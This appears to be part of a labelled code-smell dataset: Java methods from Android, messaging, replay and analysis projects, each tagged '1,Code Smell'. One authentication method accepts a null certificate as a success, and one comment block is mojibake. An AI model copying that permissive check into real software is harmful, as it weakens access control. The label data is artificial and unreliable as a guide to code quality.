  Map<String,Set<String>> groupTopicMap=new HashMap<>();
  StringBuilder strBuff=new StringBuilder(512);
  if (groupSet == null || groupSet.isEmpty()) {
    return groupTopicMap;
  }
  String groupNode=strBuff.append(this.consumerZkDir).toString();
  strBuff.delete(0,strBuff.length());
  for (  String group : groupSet) {
    String topicNode=strBuff.append(groupNode).append(""/"").append(group).append(""/offsets"").toString();
    List<String> consumeTopics=ZKUtil.getChildren(this.zkw,topicNode);
    strBuff.delete(0,strBuff.length());
    Set<String> topicSet=new HashSet<>();
    if (consumeTopics != null) {
      for (      String topic : consumeTopics) {
        if (topic == null) {
          continue;
        }
        String brokerNode=strBuff.append(topicNode).append(""/"").append(topic).toString();
        List<String> brokerIds=ZKUtil.getChildren(this.zkw,brokerNode);
        strBuff.delete(0,strBuff.length());
        if (brokerIds != null) {
          for (          String idStr : brokerIds) {
            if (idStr != null) {
              String[] brokerPartIdStrs=idStr.split(TokenConstants.HYPHEN);
              qryBrokerId=brokerPartIdStrs[0];
              if (qryBrokerId != null && strBrokerId.equals(qryBrokerId.trim())) {
                topicSet.add(topic);
                break;
              }
            }
          }
        }
      }
    }
    if (!topicSet.isEmpty()) {
      groupTopicMap.put(group,topicSet);
    }
  }
  return groupTopicMap;
}",1,Code Smell
"@TargetApi(Build.VERSION_CODES.P) public void populateAndShow(final BubbleTextView originalIcon,int shortcutCount,final List<NotificationKeyData> notificationKeys,List<SystemShortcut> shortcuts){
  mNumNotifications=notificationKeys.size();
  mOriginalIcon=originalIcon;
  boolean hasDeepShortcuts=shortcutCount > 0;
  mContainerWidth=getResources().getDimensionPixelSize(R.dimen.bg_popup_item_width);
  if (mNumNotifications > 0) {
    if (mNotificationContainer == null) {
      mNotificationContainer=findViewById(R.id.notification_container);
      mNotificationContainer.setVisibility(VISIBLE);
      mNotificationContainer.setPopupView(this);
    }
 else {
      mNotificationContainer.setVisibility(GONE);
    }
    updateNotificationHeader();
  }
  mSystemShortcutContainer=this;
  if (mDeepShortcutContainer == null) {
    mDeepShortcutContainer=findViewById(R.id.deep_shortcuts_container);
  }
  if (hasDeepShortcuts) {
    List<SystemShortcut> systemShortcuts=getNonWidgetSystemShortcuts(shortcuts);
    mContainerWidth=Math.max(mContainerWidth,systemShortcuts.size() * getResources().getDimensionPixelSize(R.dimen.system_shortcut_header_icon_touch_size));
    mDeepShortcutContainer.setVisibility(View.VISIBLE);
    for (int i=shortcutCount; i > 0; i--) {
      DeepShortcutView v=inflateAndAdd(R.layout.deep_shortcut,mDeepShortcutContainer);
      v.getLayoutParams().width=mContainerWidth;
      mDeepShortcuts.add(v);
    }
    updateHiddenShortcuts();
    Optional<SystemShortcut.Widgets> widgetShortcutOpt=getWidgetShortcut(shortcuts);
    if (widgetShortcutOpt.isPresent()) {
      if (mWidgetContainer == null) {
        mWidgetContainer=inflateAndAdd(R.layout.widget_shortcut_container,this,0);
      }
      initializeWidgetShortcut(mWidgetContainer,widgetShortcutOpt.get());
    }
    initializeSystemShortcuts(systemShortcuts);
  }
 else {
    mDeepShortcutContainer.setVisibility(View.GONE);
    mSystemShortcutContainer=inflateAndAdd(R.layout.system_shortcut_rows_container,this,0);
    mWidgetContainer=mSystemShortcutContainer;
    if (!shortcuts.isEmpty()) {
      for (int i=0; i < shortcuts.size(); i++) {
        initializeSystemShortcut(R.layout.system_shortcut,mSystemShortcutContainer,shortcuts.get(i),i < shortcuts.size() - 1);
      }
    }
  }
  show();
  loadAppShortcuts((ItemInfo)originalIcon.getTag(),notificationKeys);
}",1,Code Smell
"@Override public void repeat(RepeatContext context){
  Stopwatch stopwatch=Stopwatch.createStarted();
  RepeatModel record=new RepeatModel();
  record.setRepeatId(context.getMeta().getRepeatId());
  record.setTraceId(context.getTraceId());
  record.setRecordTraceId(context.getRecordModel().getTraceId());
  record.setTaskRunId(INSTANCE.getTaskRunId());
  record.setRecordTaskRunId(context.getRecordModel().getTaskRunId());
  record.setHost(INSTANCE.getHost());
  record.setStatus(ReplayStatus.REPLAY_SUCCESS.getCode());
  try {
    RepeatInterceptorFacade.instance().beforeInvoke(context.getRecordModel());
    SysTimeUtils.updateSysTime(context.getRecordModel().getTimestamp());
    Object response=executeRepeat(context);
    RepeatInterceptorFacade.instance().beforeReturn(context.getRecordModel(),response);
    record.setResponse(response);
    List<MockInvocation> mockRes=MoonboxRepeatCache.getAndRemoveMockInvocation(context.getTraceId());
    if (CollectionUtils.isNotEmpty(mockRes)) {
      List<MockInvocation> mockInvocationsForReturn=new ArrayList<>(mockRes.size());
      record.setMockInvocations(mockInvocationsForReturn);
      for (      MockInvocation mockInvocation : mockRes) {
        mockInvocationsForReturn.add(mockInvocation);
        if (!mockInvocation.isSuccess()) {
          record.setStatus(StringUtils.isBlank(mockInvocation.getOriginUri()) ? ReplayStatus.SUB_INVOKE_NOT_FOUND.getCode() : ReplayStatus.SUB_INVOKE_DIFF_FAILED.getCode());
          break;
        }
      }
    }
    stopwatch.stop();
    record.setCost(stopwatch.elapsed(TimeUnit.MILLISECONDS));
  }
 catch (  Throwable e) {
    log.error(""repeater failed msg:"" + e.getMessage(),e);
    record.setCost(stopwatch.elapsed(TimeUnit.MILLISECONDS));
    List<MockInvocation> mockRes=MoonboxRepeatCache.getAndRemoveMockInvocation(context.getTraceId());
    if (CollectionUtils.isNotEmpty(mockRes)) {
      List<MockInvocation> mockInvocationsForReturn=new ArrayList<>(mockRes.size());
      for (      MockInvocation mockInvocation : mockRes) {
        mockInvocationsForReturn.add(mockInvocation);
        if (!mockInvocation.isSuccess()) {
          record.setStatus(StringUtils.isBlank(mockInvocation.getOriginUri()) ? ReplayStatus.SUB_INVOKE_NOT_FOUND.getCode() : ReplayStatus.SUB_INVOKE_DIFF_FAILED.getCode());
          break;
        }
      }
      record.setMockInvocations(mockInvocationsForReturn);
    }
 else {
      if (record.getStatus() == ReplayStatus.REPLAY_SUCCESS.getCode()) {
        record.setStatus(ReplayStatus.REPLAY_EX.getCode());
      }
      stopwatch.stop();
      record.setResponse(e);
    }
  }
 finally {
    SysTimeUtils.updateSysTime(0L);
  }
  sendRepeat(record);
}",1,Code Smell
"public void invoke(PcodeOp pcode,AbsEnv inOutEnv,AbsEnv tmpEnv,Context context,Function callFunc){
  ALoc retALoc=getReturnALoc(callFunc,false);
  if (retALoc == null) {
    return;
  }
  Address callAddress=getAddress(pcode);
  if (taintedBufParamIndex == -1) {
    if (isReturnNewTaint) {
      long newTaints=TaintMap.getTaints(callAddress,context,callFunc);
      inOutEnv.set(retALoc,KSet.getTop(newTaints),true);
    }
    return;
  }
  KSet res=new KSet(retALoc.getLen() * 8);
  for (  ALoc bufALoc : getParamALocs(callFunc,taintedBufParamIndex,inOutEnv)) {
    KSet bufPtrKSet=inOutEnv.get(bufALoc);
    long newTaints=TaintMap.getTaints(callAddress,context,callFunc);
    if (!bufPtrKSet.isNormal()) {
      bufPtrKSet=KSet.getTop(newTaints);
      inOutEnv.set(bufALoc,bufPtrKSet,true);
    }
 else {
      for (      AbsVal bufPtr : bufPtrKSet) {
        Utils.taintBufWithTop(inOutEnv,bufPtr,newTaints);
      }
    }
    KSet union=res.join(bufPtrKSet);
    res=(union == null) ? res : union;
  }
  if (returnType == PointerDataType.dataType) {
    inOutEnv.set(retALoc,res,true);
  }
 else   if (returnType == IntegerDataType.dataType) {
    inOutEnv.set(retALoc,KSet.getTop(),true);
  }
 else {
    Logging.warn(""Undefined return data type for "" + callFunc);
  }
}",1,Code Smell
"public String getType() throws IOException {
  if (mItems.length == 0) {
    return null;
  }
  String type=mItems[0].getType();
  for (int i=0; i < mItems.length; i++) {
    if (mItems[i].encodeAsResXmlItemValue().startsWith(""@string"")) {
      return ""string"";
    }
 else     if (mItems[i].encodeAsResXmlItemValue().startsWith(""@drawable"")) {
      return null;
    }
 else     if (mItems[i].encodeAsResXmlItemValue().startsWith(""@integer"")) {
      return ""integer"";
    }
 else     if (!""string"".equals(type) && !""integer"".equals(type)) {
      return null;
    }
 else     if (!type.equals(mItems[i].getType())) {
      return null;
    }
  }
  if (!Arrays.asList(AllowedArrayTypes).contains(type)) {
    return ""string"";
  }
  return type;
}",1,Code Smell
"/** 
 * 鑾峰緱褰撳墠鐢ㄦ埛涓� 缁勭粐
 * @return ResultWrapper
 */
@ApiOperation(value=""鑾峰緱褰撳墠鐢ㄦ埛涓� 缁勭粐"",notes=""鑾峰緱褰撳墠鐢ㄦ埛涓� 缁勭粐"") @Override public ResultWrapper<?> findTreeByDefWithUserToLike(){
  String parentId=PARENT_ID;
  List<SysOrgModel> orgModelList=OrgUtil.createDefShowNodes(parentId,Lists.newArrayList());
  QueryBuilder<SysOrg> queryBuilder=new GenQueryBuilder<>();
  QueryWrapper<SysOrg> wrapper=queryBuilder.build();
  List<UserOrgRefModel> orgListByUserId=UserUtil.getOrgByCurrUser();
  if (!CollUtil.isEmpty(orgListByUserId)) {
    List<String> parentIdList=Lists.newArrayListWithCapacity(orgListByUserId.size());
    for (    UserOrgRefModel userOrgRefModel : orgListByUserId) {
      String orgId=userOrgRefModel.getOrgId();
      String orgIds=userOrgRefModel.getOrgIds();
      String parentIds=StrUtil.replace(orgIds,StrUtil.prependIfMissing(orgId,DELIMITER),"""");
      parentIdList.add(parentIds);
    }
    parentIdList=ListDistinctUtil.distinct(parentIdList);
    List<String> finalParentIdList=parentIdList;
    wrapper.and(wra -> {
      for (int i=0; i < finalParentIdList.size(); i++) {
        wra.likeRight(FieldUtil.humpToUnderline(MyBatisConstants.FIELD_PARENT_IDS),finalParentIdList.get(i));
        if (i < finalParentIdList.size() - 1) {
          wra.or();
        }
      }
    }
);
    List<SysOrg> dataList=IService.findList(wrapper);
    if (CollUtil.isNotEmpty(dataList)) {
      for (      SysOrg sysOrg : dataList) {
        if (!CollUtil.contains(parentIdList,sysOrg.getParentIds())) {
          continue;
        }
        sysOrg.setParentId(parentId);
      }
      orgModelList.addAll(WrapperUtil.transformInstance(dataList,IService.getModelClass()));
    }
  }
  return handleOrgTree(parentId,orgModelList,false);
}",1,Code Smell
"/** 
 * Creates the notification given the current player state.
 * @param player The player for which state to build a notification.
 * @param builder The builder used to build the last notification, or {@code null}. Re-using the builder when possible can prevent notification flicker when  {@code Util#SDK_INT} &lt; 21.
 * @param ongoing Whether the notification should be ongoing.
 * @param largeIcon The large icon to be used.
 * @return The {@link NotificationCompat.Builder} on which to call {@link NotificationCompat.Builder#build()} to obtain the notification, or {@code null} if nonotification should be displayed.
 */
@Nullable protected NotificationCompat.Builder createNotification(Player player,@Nullable NotificationCompat.Builder builder,boolean ongoing,@Nullable Bitmap largeIcon){
  if (player.getPlaybackState() == Player.STATE_IDLE && (player.getCurrentTimeline().isEmpty() || playbackPreparer == null)) {
    builderActions=null;
    return null;
  }
  List<String> actionNames=getActions(player);
  ArrayList<NotificationCompat.Action> actions=new ArrayList<>(actionNames.size());
  for (int i=0; i < actionNames.size(); i++) {
    String actionName=actionNames.get(i);
    NotificationCompat.Action action=playbackActions.containsKey(actionName) ? playbackActions.get(actionName) : customActions.get(actionName);
    if (action != null) {
      actions.add(action);
    }
  }
  if (builder == null || !actions.equals(builderActions)) {
    builder=new NotificationCompat.Builder(context,channelId);
    builderActions=actions;
    for (int i=0; i < actions.size(); i++) {
      builder.addAction(actions.get(i));
    }
  }
  MediaStyle mediaStyle=new MediaStyle();
  if (mediaSessionToken != null) {
    mediaStyle.setMediaSession(mediaSessionToken);
  }
  mediaStyle.setShowActionsInCompactView(getActionIndicesForCompactView(actionNames,player));
  mediaStyle.setShowCancelButton(!ongoing);
  mediaStyle.setCancelButtonIntent(dismissPendingIntent);
  builder.setStyle(mediaStyle);
  builder.setDeleteIntent(dismissPendingIntent);
  builder.setBadgeIconType(badgeIconType).setOngoing(ongoing).setColor(color).setColorized(colorized).setSmallIcon(smallIconResourceId).setVisibility(visibility).setPriority(priority).setDefaults(defaults);
  if (Util.SDK_INT >= 21 && useChronometer && player.isPlaying() && !player.isPlayingAd() && !player.isCurrentWindowDynamic()) {
    builder.setWhen(System.currentTimeMillis() - player.getContentPosition()).setShowWhen(true).setUsesChronometer(true);
  }
 else {
    builder.setShowWhen(false).setUsesChronometer(false);
  }
  builder.setContentTitle(mediaDescriptionAdapter.getCurrentContentTitle(player));
  builder.setContentText(mediaDescriptionAdapter.getCurrentContentText(player));
  builder.setSubText(mediaDescriptionAdapter.getCurrentSubText(player));
  if (largeIcon == null) {
    largeIcon=mediaDescriptionAdapter.getCurrentLargeIcon(player,new BitmapCallback(++currentNotificationTag));
  }
  setLargeIcon(builder,largeIcon);
  builder.setContentIntent(mediaDescriptionAdapter.createCurrentContentIntent(player));
  return builder;
}",1,Code Smell
"private void prepareTableChanges(TableView<BrowserEntry> table,TableColumn<BrowserEntry,Instant> mtimeCol,TableColumn<BrowserEntry,String> modeCol){
  var lastDir=new SimpleObjectProperty<FileSystem.FileEntry>();
  Runnable updateHandler=() -> {
    Platform.runLater(() -> {
      var newItems=new ArrayList<>(fileList.getShown().getValue());
      var hasModifiedDate=newItems.size() == 0 || newItems.stream().anyMatch(entry -> entry.getRawFileEntry().getDate() != null);
      if (!hasModifiedDate) {
        table.getColumns().remove(mtimeCol);
      }
 else {
        if (!table.getColumns().contains(mtimeCol)) {
          table.getColumns().add(mtimeCol);
        }
      }
      if (fileList.getFileSystemModel().getFileSystem() != null) {
        var shell=fileList.getFileSystemModel().getFileSystem().getShell().orElseThrow();
        var hasAttributes=!OsType.WINDOWS.equals(shell.getOsType());
        if (!hasAttributes) {
          table.getColumns().remove(modeCol);
        }
 else {
          if (!table.getColumns().contains(modeCol)) {
            table.getColumns().add(modeCol);
          }
        }
      }
      if (!table.getItems().equals(newItems)) {
        var obs=FXCollections.observableList(newItems);
        table.getItems().setAll(obs);
      }
      var currentDirectory=fileList.getFileSystemModel().getCurrentDirectory();
      if (!Objects.equals(lastDir.get(),currentDirectory)) {
        TableViewSkin<?> skin=(TableViewSkin<?>)table.getSkin();
        if (skin != null) {
          VirtualFlow<?> flow=(VirtualFlow<?>)skin.getChildren().get(1);
          ScrollBar vbar=(ScrollBar)flow.getChildrenUnmodifiable().get(2);
          if (vbar.getValue() != 0.0) {
            table.scrollTo(0);
          }
        }
      }
      lastDir.setValue(currentDirectory);
    }
);
  }
;
  updateHandler.run();
  fileList.getShown().addListener((observable,oldValue,newValue) -> {
    updateHandler.run();
  }
);
  fileList.getFileSystemModel().getCurrentPath().addListener((observable,oldValue,newValue) -> {
    if (oldValue == null) {
      updateHandler.run();
    }
  }
);
}",1,Code Smell
"@Override public boolean identityValidBrokerInfo(ClientMaster.MasterCertificateInfo certificateInfo,ProcessResult result){
  if (!masterConfig.isNeedBrokerVisitAuth()) {
    result.setSuccResult(new CertifiedInfo());
    return result.isSuccess();
  }
  if (certificateInfo == null) {
    result.setSuccResult(new CertifiedInfo());
    return result.isSuccess();
  }
  ClientMaster.AuthenticateInfo authInfo=certificateInfo.getAuthInfo();
  if (authInfo == null) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Illegal value: AuthenticateInfo is null!"");
    return result.isSuccess();
  }
  if (TStringUtils.isBlank(authInfo.getUserName())) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Illegal value: authInfo.userName is Blank!"");
    return result.isSuccess();
  }
  String inUserName=authInfo.getUserName().trim();
  if (TStringUtils.isBlank(authInfo.getSignature())) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Illegal value: authInfo.signature is Blank!"");
    return result.isSuccess();
  }
  String inSignature=authInfo.getSignature().trim();
  if (!inUserName.equals(masterConfig.getVisitName())) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Illegal value: userName is not equal in authenticateToken!"");
    return result.isSuccess();
  }
  if (Math.abs(System.currentTimeMillis() - authInfo.getTimestamp()) > masterConfig.getAuthValidTimeStampPeriodMs()) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Illegal value: timestamp out of effective period in authenticateToken!"");
    return result.isSuccess();
  }
  String signature=TStringUtils.getAuthSignature(inUserName,masterConfig.getVisitPassword(),authInfo.getTimestamp(),authInfo.getNonce());
  if (!inSignature.equals(signature)) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Illegal value: userName or password is not correct!"");
    return result.isSuccess();
  }
  result.setSuccResult(new CertifiedInfo());
  return result.isSuccess();
}
",1,Code Smell
"public static boolean processErrors(TLRPC.TL_error err,BaseFragment fragment,BulletinFactory factory){
  if (err == null || TextUtils.isEmpty(err.text)) {
    return true;
  }
  if (""INVITE_PEERS_TOO_MUCH"".equals(err.text)) {
    new LimitReachedBottomSheet(fragment,fragment.getContext(),LimitReachedBottomSheet.TYPE_CHATS_IN_FOLDER,fragment.getCurrentAccount(),null).show();
  }
 else   if (""PEERS_LIST_EMPTY"".equals(err.text)) {
    factory.createErrorBulletin(LocaleController.getString(""FolderLinkNoChatsError"",R.string.FolderLinkNoChatsError)).show();
  }
 else   if (""USER_CHANNELS_TOO_MUCH"".equals(err.text)) {
    factory.createErrorBulletin(LocaleController.getString(""FolderLinkOtherAdminLimitError"",R.string.FolderLinkOtherAdminLimitError)).show();
  }
 else   if (""CHANNELS_TOO_MUCH"".equals(err.text)) {
    new LimitReachedBottomSheet(fragment,fragment.getContext(),LimitReachedBottomSheet.TYPE_TO0_MANY_COMMUNITIES,fragment.getCurrentAccount(),null).show();
  }
 else   if (""INVITES_TOO_MUCH"".equals(err.text)) {
    new LimitReachedBottomSheet(fragment,fragment.getContext(),LimitReachedBottomSheet.TYPE_FOLDER_INVITES,fragment.getCurrentAccount(),null).show();
  }
 else   if (""CHATLISTS_TOO_MUCH"".equals(err.text)) {
    new LimitReachedBottomSheet(fragment,fragment.getContext(),LimitReachedBottomSheet.TYPE_SHARED_FOLDERS,fragment.getCurrentAccount(),null).show();
  }
 else   if (""INVITE_SLUG_EXPIRED"".equals(err.text)) {
    factory.createErrorBulletin(LocaleController.getString(""NoFolderFound"",R.string.NoFolderFound)).show();
  }
 else   if (""FILTER_INCLUDE_TOO_MUCH"".equals(err.text)) {
    new LimitReachedBottomSheet(fragment,fragment.getContext(),LimitReachedBottomSheet.TYPE_CHATS_IN_FOLDER,fragment.getCurrentAccount(),null).show();
  }
 else   if (""DIALOG_FILTERS_TOO_MUCH"".equals(err.text)) {
    new LimitReachedBottomSheet(fragment,fragment.getContext(),LimitReachedBottomSheet.TYPE_FOLDERS,fragment.getCurrentAccount(),null).show();
  }
 else {
    factory.createErrorBulletin(LocaleController.getString(""UnknownError"",R.string.UnknownError)).show();
  }
  return true;
}",1,Code Smell
"private static void solveGridPlacement(@NonNull final DatabaseHelper helper,@NonNull final DbReader srcReader,@NonNull final DbReader destReader,final int screenId,final int trgX,final int trgY,@NonNull final List<DbEntry> sortedItemsToPlace,final boolean matchingScreenIdOnly){
  final GridOccupancy occupied=new GridOccupancy(trgX,trgY);
  final Point trg=new Point(trgX,trgY);
  final Point next=new Point(0,screenId == 0 && FeatureFlags.QSbOnFirstScreen(NeoApp.getInstance()) ? 1 : 0);
  List<DbEntry> existedEntries=destReader.mWorkspaceEntriesByScreenId.get(screenId);
  if (existedEntries != null) {
    for (    DbEntry entry : existedEntries) {
      occupied.markCells(entry,true);
    }
  }
  Iterator<DbEntry> iterator=sortedItemsToPlace.iterator();
  while (iterator.hasNext()) {
    final DbEntry entry=iterator.next();
    if (matchingScreenIdOnly && entry.screenId < screenId)     continue;
    if (matchingScreenIdOnly && entry.screenId > screenId)     break;
    if (entry.minSpanX > trgX || entry.minSpanY > trgY) {
      iterator.remove();
      continue;
    }
    if (findPlacementForEntry(entry,next,trg,occupied,screenId)) {
      insertEntryInDb(helper,entry,srcReader.mTableName,destReader.mTableName);
      iterator.remove();
    }
  }
}",1,Code Smell
"/** 
 * Returns a new visitor which runs the supplied visitor in a loop until no more changes are made, or a maximum of 3 cycles is reached. Convenient when a visitor is designed to recursively apply itself to a tree to achieve its desired result. Stops early if the visitor ceases to make changes to the tree before the maximum number of cycles is reached.
 */
public static TreeVisitor<?,ExecutionContext> repeatUntilStable(TreeVisitor<?,ExecutionContext> v){
  return repeatUntilStable(v,3);
}
/** 
 * Returns a new visitor which runs the supplied visitor in a loop until no more changes are made, or the maximum number of cycles is reached. Convenient when a visitor is designed to recursively apply itself to a tree to achieve its desired result. Stops early if the visitor ceases to make changes to the tree before the maximum number of cycles is reached.
 */
public static TreeVisitor<?,ExecutionContext> repeatUntilStable(TreeVisitor<?,ExecutionContext> v,int maxCycles){
  return new TreeVisitor<Tree,ExecutionContext>(){
    @Override public @Nullable Tree visit(    @Nullable Tree tree,    ExecutionContext ctx){
      if (tree instanceof SourceFile && !v.isAcceptable((SourceFile)tree,ctx)) {
        return tree;
      }
      if (tree != null && !(tree instanceof SourceFile) && getCursor().isRoot()) {
        throw new IllegalArgumentException(String.format(""Repeat visitor called on a non-source file tree without a cursor pointing to the root of the tree. "" + ""Passed tree type: `%s`. "" + ""This is likely a bug in the calling code. Use a `visit` method that accepts a cursor instead."",tree.getClass().getName()));
      }
      Tree previous=tree;
      Tree current=null;
      for (int i=0; i < maxCycles; i++) {
        current=v.visit(previous,ctx);
        if (current == previous) {
          break;
        }
        previous=current;
      }
      return current;
    }
    @Override public @Nullable Tree visit(    @Nullable Tree tree,    ExecutionContext ctx,    Cursor parent){
      if (tree instanceof SourceFile && !v.isAcceptable((SourceFile)tree,ctx)) {
        return tree;
      }
      Tree previous=tree;
      Tree current=null;
      for (int i=0; i < maxCycles; i++) {
        current=v.visit(previous,ctx,parent);
        if (current == previous) {
          break;
        }
        previous=current;
      }
      return current;
    }
  }
;
}",1,Code Smell
"/** 
 * Parses a date value from the stream.
 */
protected long parseDate() throws IOException {
  if (_utcCalendar == null)   _utcCalendar=Calendar.getInstance(TimeZone.getTimeZone(""UTC""));
  return parseDate(_utcCalendar);
}
/** 
 * Parses a date value from the stream.
 */
protected long parseDate(Calendar calendar) throws IOException {
  int ch=skipWhitespace();
  int year=0;
  for (int i=0; i < 4; i++) {
    if (ch >= '0' && ch <= '9')     year=10 * year + ch - '0';
 else     throw expectedChar(""year"",ch);
    ch=read();
  }
  int month=0;
  for (int i=0; i < 2; i++) {
    if (ch >= '0' && ch <= '9')     month=10 * month + ch - '0';
 else     throw expectedChar(""month"",ch);
    ch=read();
  }
  int day=0;
  for (int i=0; i < 2; i++) {
    if (ch >= '0' && ch <= '9')     day=10 * day + ch - '0';
 else     throw expectedChar(""day"",ch);
    ch=read();
  }
  if (ch != 'T')   throw expectedChar(""`T'"",ch);
  ch=read();
  int hour=0;
  for (int i=0; i < 2; i++) {
    if (ch >= '0' && ch <= '9')     hour=10 * hour + ch - '0';
 else     throw expectedChar(""hour"",ch);
    ch=read();
  }
  int minute=0;
  for (int i=0; i < 2; i++) {
    if (ch >= '0' && ch <= '9')     minute=10 * minute + ch - '0';
 else     throw expectedChar(""minute"",ch);
    ch=read();
  }
  int second=0;
  for (int i=0; i < 2; i++) {
    if (ch >= '0' && ch <= '9')     second=10 * second + ch - '0';
 else     throw expectedChar(""second"",ch);
    ch=read();
  }
  int ms=0;
  if (ch == '.') {
    ch=read();
    while (ch >= '0' && ch <= '9') {
      ms=10 * ms + ch - '0';
      ch=read();
    }
  }
  for (; ch > 0 && ch != '<'; ch=read()) {
  }
  _peek=ch;
  calendar.set(Calendar.YEAR,year);
  calendar.set(Calendar.MONTH,month - 1);
  calendar.set(Calendar.DAY_OF_MONTH,day);
  calendar.set(Calendar.HOUR_OF_DAY,hour);
  calendar.set(Calendar.MINUTE,minute);
  calendar.set(Calendar.SECOND,second);
  calendar.set(Calendar.MILLISECOND,ms);
  return calendar.getTime().getTime();
}",1,Code Smell
"protected boolean isPropertiesMatched(SchemaGuard schemaGuard,GuardEntity guardEntity){
  List<SchemaPropertyPattern> patterns=(schemaGuard.getPropertyPatterns() == null ? Collections.emptyList() : schemaGuard.getPropertyPatterns());
  List<SchemaProperty> properties=(guardEntity.getProperties() == null ? Collections.emptyList() : guardEntity.getProperties());
  if (patterns.isEmpty()) {
    if (schemaGuard.isEmptyPropertyPatternsForAll())     return true;
 else     return properties.isEmpty();
  }
  if (properties.isEmpty())   return false;
  String pmm=schemaGuard.getPropertiesMatchMode();
  if (StringUtil.isEmpty(pmm))   pmm=SchemaGuard.PROPERTIES_MATCH_MODE_ANY;
  if (SchemaGuard.PROPERTIES_MATCH_MODE_ANY.equalsIgnoreCase(pmm)) {
    for (    SchemaPropertyPattern pattern : patterns) {
      String namePattern=(StringUtil.isEmpty(pattern.getNamePattern()) ? AsteriskPatternMatcher.ALL_PATTERN : pattern.getNamePattern());
      String valuePattern=(StringUtil.isEmpty(pattern.getValuePattern()) ? AsteriskPatternMatcher.ALL_PATTERN : pattern.getValuePattern());
      boolean myMatches=false;
      for (      SchemaProperty p : properties) {
        if (this.asteriskPatternMatcher.matches(namePattern,p.getName()) && this.asteriskPatternMatcher.matches(valuePattern,p.getValue())) {
          myMatches=true;
          break;
        }
      }
      if (myMatches)       return true;
    }
    return false;
  }
 else   if (SchemaGuard.PROPERTIES_MATCH_MODE_ALL.equalsIgnoreCase(pmm)) {
    for (    SchemaPropertyPattern pattern : patterns) {
      String namePattern=(StringUtil.isEmpty(pattern.getNamePattern()) ? AsteriskPatternMatcher.ALL_PATTERN : pattern.getNamePattern());
      String valuePattern=(StringUtil.isEmpty(pattern.getValuePattern()) ? AsteriskPatternMatcher.ALL_PATTERN : pattern.getValuePattern());
      boolean myMatches=false;
      for (      SchemaProperty p : properties) {
        if (this.asteriskPatternMatcher.matches(namePattern,p.getName()) && this.asteriskPatternMatcher.matches(valuePattern,p.getValue())) {
          myMatches=true;
          break;
        }
      }
      if (!myMatches)       return false;
    }
    return true;
  }
 else {
    return false;
  }
}
",1,Code Smell
"private void showPopup(Runnable setupRunnable,View parent,int gravity,int x,int y,boolean blurAndBounce){
  if (popupWindow != null && popupWindow.isShowing()) {
    popupWindow.dismiss();
    return;
  }
  if (popupLayout == null) {
    popupRect=new android.graphics.Rect();
    popupLayout=new PopupWindowLayout(getContext());
    popupLayout.setAnimationEnabled(true);
    popupLayout.setOnTouchListener((v,event) -> {
      if (event.getActionMasked() == MotionEvent.ACTION_DOWN) {
        if (popupWindow != null && popupWindow.isShowing()) {
          v.getHitRect(popupRect);
          if (!popupRect.contains((int)event.getX(),(int)event.getY())) {
            popupWindow.dismiss();
          }
        }
      }
      return false;
    }
);
    popupLayout.setDispatchKeyEventListener(keyEvent -> {
      if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_BACK && keyEvent.getRepeatCount() == 0 && popupWindow != null && popupWindow.isShowing()) {
        popupWindow.dismiss();
      }
    }
);
    popupLayout.setShownFromBottom(true);
  }
  popupLayout.enableBounce=blurAndBounce;
  popupLayout.removeInnerViews();
  setupRunnable.run();
  if (popupWindow == null) {
    popupWindow=new ActionBarPopupWindow(popupLayout,LayoutHelper.WRAP_CONTENT,LayoutHelper.WRAP_CONTENT);
    popupWindow.setAnimationEnabled(true);
    popupWindow.setAnimationStyle(R.style.PopupAnimation);
    popupWindow.setOutsideTouchable(true);
    popupWindow.setClippingEnabled(true);
    popupWindow.setInputMethodMode(ActionBarPopupWindow.INPUT_METHOD_NOT_NEEDED);
    popupWindow.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_UNSPECIFIED);
    popupWindow.getContentView().setFocusableInTouchMode(true);
    popupWindow.setOnDismissListener(() -> popupLayout.removeInnerViews());
  }
  popupLayout.measure(MeasureSpec.makeMeasureSpec(dp(1000),MeasureSpec.AT_MOST),MeasureSpec.makeMeasureSpec(dp(1000),MeasureSpec.AT_MOST));
  popupWindow.setFocusable(true);
  if ((gravity & Gravity.TOP) != 0) {
    x-=popupLayout.getMeasuredWidth() / 2;
    y-=popupLayout.getMeasuredHeight();
  }
  popupWindow.showAtLocation(parent,gravity,x,y);
  popupWindow.startAnimation(popupLayout);
  Drawable baseDrawable=getContext().getResources().getDrawable(R.drawable.popup_fixed_alert3).mutate();
  if (blurAndBounce) {
    popupLayout.setBackgroundDrawable(new BlurringShader.StoryBlurDrawer(blurManager,popupLayout,BlurringShader.StoryBlurDrawer.BLUR_TYPE_MENU_BACKGROUND).makeDrawable(x,y,baseDrawable,dpf2(8.3f)));
  }
 else {
    popupLayout.setBackgroundDrawable(baseDrawable);
    popupLayout.setBackgroundColor(-14145495);
  }
}",1,Code Smell
"@Override protected void drawPickerChart(Canvas canvas){
  int bottom=getMeasuredHeight() - PICKER_PADDING;
  int top=getMeasuredHeight() - pikerHeight - PICKER_PADDING;
  int nl=lines.size();
  if (chartData != null) {
    for (int k=0; k < nl; k++) {
      LineViewData line=lines.get(k);
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePath.reset();
      int n=chartData.xPercentage.length;
      int j=0;
      final long[] y=line.line.y;
      line.chartPath.reset();
      for (int i=0; i < n; i++) {
        if (y[i] < 0)         continue;
        float xPoint=chartData.xPercentage[i] * pickerWidth;
        float h=ANIMATE_PICKER_SIZES ? pickerMaxHeight : chartData.maxValue;
        float yPercentage=(float)y[i] * chartData.linesK[k] / h;
        float yPoint=(1f - yPercentage) * (bottom - top);
        if (USE_LINES) {
          if (j == 0) {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
 else {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
        }
 else {
          if (i == 0) {
            line.bottomLinePath.moveTo(xPoint,yPoint);
          }
 else {
            line.bottomLinePath.lineTo(xPoint,yPoint);
          }
        }
      }
